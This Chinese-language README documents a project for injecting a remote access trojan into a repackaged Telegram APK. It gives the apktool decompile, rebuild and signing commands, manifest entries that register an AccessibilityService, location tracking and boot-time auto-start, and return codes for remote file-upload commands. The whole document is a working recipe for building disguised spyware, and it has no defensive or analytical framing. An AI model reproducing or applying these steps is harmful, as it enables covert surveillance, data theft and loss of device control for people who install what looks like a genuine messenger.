# Android码（Telegram）
### insertFRat

此项目用于生成部分需要添加的smali代码，如myService中动态加载包含RAT逻辑的jar并执行，注册屏幕监听事件。

#### 生成方式

### Telegram 编译打包
-gradlew makeJar  // 生成jar
-dx --dex --output ratdex.jar rat.jar // 转换jar
-java -jar apktool_2.4.1.jar d app-debug.apk // 反编译APK，得到smail
-java -jar apktool_2.4.1.jar b .\Telegram_v6.3.0_apkpure.com -o te-rat.apk
-jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keypass 123456 -storepass 123456 -keystore demo.keystore te-rat.apk demo.keystore

#### 指令返回
## 0          //success
## 10001      //没有权限，无法执行操作
## 10002      //文件上传失败，请重试
## 10003      //指令参数错误，参数为目录
## 10004      //文件夹已存在
## 10005      //文件夹创建失败

#### Telegram 配置
### AccessibilityService
## <service
##     android:name="com.hhm.android.otherapp.myService"
##     android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
##     <intent-filter>
##         <action android:name="android.accessibilityservice.AccessibilityService"/>
##     </intent-filter>
##     <meta-data
##         android:name="android.accessibilityservice"
##         android:resource="@xml/accessibility"/>
## </service>

### 高德地图
## <service android:name="com.amap.api.location.APSService" />
## <meta-data
##     android:name="com.amap.api.v2.apikey"
##     android:value="9ca8190b472b1e379bb7b11943b60618" />

### 开机自启动
## <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
## <receiver
##     android:name="com.hhm.android.otherapp.BootReceiver"
##     android:enabled="true"
##     android:exported="true"
##     android:priority="1000">
##     <intent-filter android:directBootAware="true">
##         <action android:name="android.intent.action.BOOT_COMPLETED" />
##         <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
##         <action android:name="android.intent.action.QUICKBOOT_POWERON" />
##         <action android:name="android.intent.action.REBOOT"/>
##         <category android:name="android.intent.category.HOME" />
##     </intent-filter>
## </receiver>
